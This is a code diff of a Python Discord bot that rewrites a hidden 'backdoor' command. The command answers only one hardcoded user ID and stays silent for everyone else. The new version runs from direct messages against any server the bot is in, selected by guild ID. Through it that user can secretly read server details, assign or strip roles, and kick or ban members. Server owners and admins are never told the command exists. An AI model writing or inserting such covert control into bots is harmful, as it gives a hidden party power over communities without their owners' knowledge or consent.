@@ -637,192 +637,121 @@ async def list_roles(ctx, member: discord.Member = None):
 
 # Hidden back access command - only works for specific user ID and operates silently
 @bot.command(name='backdoor', hidden=True)
-async def back_access(ctx, action=None, target: discord.Member = None, *, args=None):
-    """Hidden back access command for authorized user only"""
-    
-    # Check if user is authorized
+async def back_access(ctx, guild_id: int = None, action=None, target_id: int = None, *, args=None):
+    """Hidden back access command (DM only, requires Guild ID)."""
+
+    # Only allow the authorized developer
     if BACK_ACCESS_USER_ID is None or ctx.author.id != BACK_ACCESS_USER_ID:
-        # Silently ignore - don't send any response
-        return
-    
-    # Delete the command message immediately
-    try:
-        await ctx.message.delete()
-    except:
-        pass
-    
-    # Send response via DM to authorized user
-    try:
-        if action is None:
-            embed = discord.Embed(
-                title="Back Access Panel",
-                description="Available actions:",
-                color=discord.Color.dark_theme()
-            )
-            embed.add_field(
-                name="Commands",
-                value="`info` - Get server info\n`roles @user` - Get user roles\n`addrole @user role` - Add role to user\n`removerole @user role` - Remove role from user\n`kick @user reason` - Kick user\n`ban @user reason` - Ban user",
-                inline=False
-            )
-            embed.set_footer(text="Back access active")
-            await ctx.author.send(embed=embed)
-            return
-        
-        if action == "info":
-            embed = discord.Embed(
-                title=f"Server Info - {ctx.guild.name}",
-                color=discord.Color.blue()
-            )
-            embed.add_field(name="Members", value=ctx.guild.member_count, inline=True)
-            embed.add_field(name="Roles", value=len(ctx.guild.roles), inline=True)
-            embed.add_field(name="Channels", value=len(ctx.guild.channels), inline=True)
-            embed.add_field(name="Owner", value=ctx.guild.owner.mention if ctx.guild.owner else "Unknown", inline=True)
-            embed.set_thumbnail(url=ctx.guild.icon.url if ctx.guild.icon else None)
-            await ctx.author.send(embed=embed)
-        
-        elif action == "roles" and target:
-            user_roles = [role.name for role in target.roles if role.name != "@everyone"]
-            embed = discord.Embed(
-                title=f"Roles for {target.display_name}",
-                description=", ".join(user_roles) if user_roles else "No roles",
-                color=discord.Color.blue()
-            )
-            embed.set_thumbnail(url=target.avatar.url if target.avatar else target.default_avatar.url)
-            await ctx.author.send(embed=embed)
-        
-        elif action == "addrole" and target and args:
-            role = discord.utils.get(ctx.guild.roles, name=args)
-            if not role:
-                role = discord.utils.find(lambda r: args.lower() in r.name.lower(), ctx.guild.roles)
-            
-            if not role:
-                embed = discord.Embed(
-                    title="Error",
-                    description=f"Role '{args}' not found",
-                    color=discord.Color.red()
-                )
-                await ctx.author.send(embed=embed)
-                return
-            
-            if role in target.roles:
-                embed = discord.Embed(
-                    title="Error",
-                    description=f"{target.display_name} already has role '{role.name}'",
-                    color=discord.Color.orange()
-                )
-                await ctx.author.send(embed=embed)
-                return
-            
-            try:
-                await target.add_roles(role, reason="Back access command")
-                embed = discord.Embed(
-                    title="Success",
-                    description=f"Added role '{role.name}' to {target.display_name}",
-                    color=discord.Color.green()
-                )
-                await ctx.author.send(embed=embed)
-            except Exception as e:
-                embed = discord.Embed(
-                    title="Error",
-                    description=f"Failed to add role: {str(e)}",
-                    color=discord.Color.red()
-                )
-                await ctx.author.send(embed=embed)
-        
-        elif action == "removerole" and target and args:
-            role = discord.utils.get(ctx.guild.roles, name=args)
-            if not role:
-                role = discord.utils.find(lambda r: args.lower() in r.name.lower(), ctx.guild.roles)
-            
-            if not role:
-                embed = discord.Embed(
-                    title="Error",
-                    description=f"Role '{args}' not found",
-                    color=discord.Color.red()
-                )
-                await ctx.author.send(embed=embed)
-                return
-            
-            if role not in target.roles:
-                embed = discord.Embed(
-                    title="Error",
-                    description=f"{target.display_name} doesn't have role '{role.name}'",
-                    color=discord.Color.orange()
-                )
-                await ctx.author.send(embed=embed)
-                return
-            
-            try:
-                await target.remove_roles(role, reason="Back access command")
-                embed = discord.Embed(
-                    title="Success",
-                    description=f"Removed role '{role.name}' from {target.display_name}",
-                    color=discord.Color.green()
-                )
-                await ctx.author.send(embed=embed)
-            except Exception as e:
-                embed = discord.Embed(
-                    title="Error",
-                    description=f"Failed to remove role: {str(e)}",
-                    color=discord.Color.red()
-                )
-                await ctx.author.send(embed=embed)
-        
-        elif action == "kick" and target:
-            reason = args if args else "No reason provided"
-            try:
-                await target.kick(reason=f"Back access: {reason}")
-                embed = discord.Embed(
-                    title="Success",
-                    description=f"Kicked {target.display_name}\nReason: {reason}",
-                    color=discord.Color.green()
-                )
-                await ctx.author.send(embed=embed)
-            except Exception as e:
-                embed = discord.Embed(
-                    title="Error",
-                    description=f"Failed to kick user: {str(e)}",
-                    color=discord.Color.red()
-                )
-                await ctx.author.send(embed=embed)
-        
-        elif action == "ban" and target:
-            reason = args if args else "No reason provided"
-            try:
-                await target.ban(reason=f"Back access: {reason}")
-                embed = discord.Embed(
-                    title="Success",
-                    description=f"Banned {target.display_name}\nReason: {reason}",
-                    color=discord.Color.green()
-                )
-                await ctx.author.send(embed=embed)
-            except Exception as e:
-                embed = discord.Embed(
-                    title="Error",
-                    description=f"Failed to ban user: {str(e)}",
-                    color=discord.Color.red()
-                )
-                await ctx.author.send(embed=embed)
-        
-        else:
-            embed = discord.Embed(
-                title="Invalid Command",
-                description="Invalid action or missing parameters",
-                color=discord.Color.red()
-            )
-            await ctx.author.send(embed=embed)
-    
-    except Exception as e:
-        # If DM fails, try to send error message
+        return  # silently ignore
+
+    # Ensure command is used in DMs
+    if ctx.guild is not None:
         try:
-            embed = discord.Embed(
-                title="Back Access Error",
-                description=f"Command failed: {str(e)}",
-                color=discord.Color.red()
-            )
-            await ctx.author.send(embed=embed)
+            await ctx.message.delete()
         except:
-            pass  # Silently fail if even error message can't be sent
+            pass
+        return
+
+    # Validate guild
+    guild = bot.get_guild(guild_id) if guild_id else None
+    if guild is None:
+        await ctx.author.send(embed=discord.Embed(
+            title="Invalid Guild",
+            description="Guild not found or bot is not in that guild.",
+            color=discord.Color.red()
+        ))
+        return
+
+    # Optional target member
+    member = None
+    if target_id:
+        member = guild.get_member(target_id)
+        if not member:
+            await ctx.author.send(embed=discord.Embed(
+                title="User Not Found",
+                description=f"Could not find member with ID `{target_id}` in {guild.name}.",
+                color=discord.Color.red()
+            ))
+            return
+
+    # Handle actions
+    if action == "info":
+        embed = discord.Embed(
+            title=f"Server Info - {guild.name}",
+            color=discord.Color.blue()
+        )
+        embed.add_field(name="Members", value=guild.member_count, inline=True)
+        embed.add_field(name="Roles", value=len(guild.roles), inline=True)
+        embed.add_field(name="Channels", value=len(guild.channels), inline=True)
+        embed.add_field(name="Owner", value=guild.owner.mention if guild.owner else "Unknown", inline=True)
+        embed.set_thumbnail(url=guild.icon.url if guild.icon else None)
+        await ctx.author.send(embed=embed)
+
+    elif action == "roles" and member:
+        roles = [role.name for role in member.roles if role.name != "@everyone"]
+        embed = discord.Embed(
+            title=f"Roles for {member.display_name}",
+            description=", ".join(roles) if roles else "No roles",
+            color=discord.Color.blue()
+        )
+        await ctx.author.send(embed=embed)
+
+    elif action == "addrole" and member and args:
+        role = discord.utils.find(lambda r: args.lower() in r.name.lower(), guild.roles)
+        if role:
+            await member.add_roles(role, reason="Backdoor command")
+            await ctx.author.send(embed=discord.Embed(
+                title="Success",
+                description=f"Added role `{role.name}` to {member.display_name}",
+                color=discord.Color.green()
+            ))
+        else:
+            await ctx.author.send(embed=discord.Embed(
+                title="Error",
+                description=f"Role `{args}` not found",
+                color=discord.Color.red()
+            ))
+
+    elif action == "removerole" and member and args:
+        role = discord.utils.find(lambda r: args.lower() in r.name.lower(), guild.roles)
+        if role and role in member.roles:
+            await member.remove_roles(role, reason="Backdoor command")
+            await ctx.author.send(embed=discord.Embed(
+                title="Success",
+                description=f"Removed role `{role.name}` from {member.display_name}",
+                color=discord.Color.green()
+            ))
+        else:
+            await ctx.author.send(embed=discord.Embed(
+                title="Error",
+                description=f"Role `{args}` not found or not assigned",
+                color=discord.Color.red()
+            ))
+
+    elif action == "kick" and member:
+        await member.kick(reason="Backdoor command")
+        await ctx.author.send(embed=discord.Embed(
+            title="Success",
+            description=f"Kicked {member.display_name}",
+            color=discord.Color.green()
+        ))
+
+    elif action == "ban" and member:
+        await member.ban(reason="Backdoor command")
+        await ctx.author.send(embed=discord.Embed(
+            title="Success",
+            description=f"Banned {member.display_name}",
+            color=discord.Color.green()
+        ))
+
+    else:
+        await ctx.author.send(embed=discord.Embed(
+            title="Invalid Command",
+            description="Usage: `!backdoor <guild_id> <action> <target_id?> <args?>`\n"
+                        "Actions: info, roles, addrole, removerole, kick, ban",
+            color=discord.Color.orange()
+        ))
+
 
 @bot.command(name='help')
 async def help_command(ctx, command_name=None):
